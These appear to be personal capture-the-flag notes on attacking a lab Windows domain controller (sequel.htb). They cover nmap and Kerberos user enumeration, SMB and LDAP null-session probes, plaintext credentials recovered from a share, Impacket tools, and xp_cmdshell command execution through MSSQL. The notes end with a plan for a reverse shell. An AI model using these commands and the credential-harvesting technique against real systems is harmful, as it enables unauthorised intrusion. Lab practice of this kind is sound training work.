

![[Pasted image 20250616230815.png]]

# Given Credentials:


rose:KxEPkKe6R8su


# 1. Nmap: 
-> I always want to start here to see what ports are open and what services are running.

Lets start with a basic scan and see what we can find:
`sudo nmap -sV -sC 10.10.11.51 -oN nmap.basic`

When that scan is done I want to do a deeper scan and run that while I do other tasks.

`sudo nmap -p- -sV -sC --script=default,vuln,exploit -T4 -oN nmap.full 10.10.11.51`

==Try to find valid users with nmap==: 
`sudo nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='sequel.htb',userdb=/usr/share/wordlists/statistically-likely-usernames/us-census-base-lists/j.smith-x98800.txt 10.10.11.51`

Some output from the scan:

1. DNS: DC01.sequel.htb0
2. LDAP and smb in use

![[Pasted image 20250615172520.png]]

## What to try?
1. Null session on SMB?
	1. `rpcclient -U "" -N <target_ip> `
		1. ^^ nothing here either
	2. `smbmap -u "" -p "" -P 445 -H 10.10.11.51 && smbmap -u "guest" -p "" -P 445 -H 10.10.11.51`
		1. ^^ nuthin
2. Null session on LDAP?
	1. `ldapsearch -x -H ldap://10.10.11.51:389 -b "dc=DC01.sequel,dc=htb" "(objectClass=user)"`
	2. ^^ Got nothing here
3. User enumeration with kerbrute?

# enum4linux:
`enum4linux -a 10.10.11.35`

==Usernames:== administrator, guest, krbtgt, domain admins, root, bin

not much more than that.


# With the given credentials (*sigh* did not realize) smbmap:
`smbmap -H 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' --no-banner`

![[Pasted image 20250615180030.png]]

Let's look into the shares `Users` and `Accounting Department`

These files are on the accounting share: 
![[Pasted image 20250615180459.png]]

What do they have in them?

Likeley username: `ruy.fernandez` or `rfernandez`

==In a shared xml file there are usernames and creds==

```
angela:0fwz7Q4mSpurIt99
Oscar:86LxLBMgEWaKUnBG
kevin:Md9Wlq1E5bZnVDVo
sa:MSSQLP@ssw0rd!
```


## Enumerate users further: 
`python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py sequel.htb/"oscar":"86LxLBMgEWaKUnBG" -dc-ip 10.10.11.51 -all`

![[Pasted image 20250615183434.png]]

GROUPS:
![[Pasted image 20250615183638.png]]

Cloneable Domain Controllers??


## evil-winrm:
`evil-winrm -i 10.10.11.51 -u oscar -p '86LxLBMgEWaKUnBG'`

^^ nope

## Let's try to get a session on the sqlserver:
`python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sequel.htb/sa@10.10.11.51`

`EXEC xp_cmdshell 'whoami /priv'`

![[Pasted image 20250616221154.png]]

Ryan is part of the remote management users

==NTUSER.DAT== is accessible from the sql user:
![[Pasted image 20250616222424.png]]

## Let's get a reverse shell using revshells.com: https://www.revshells.com/


==We have some interesting files here==:
![[Pasted image 20250616231857.png]]

# Next: 
1. look up how to make reverse shell better
2. what can we find in these files
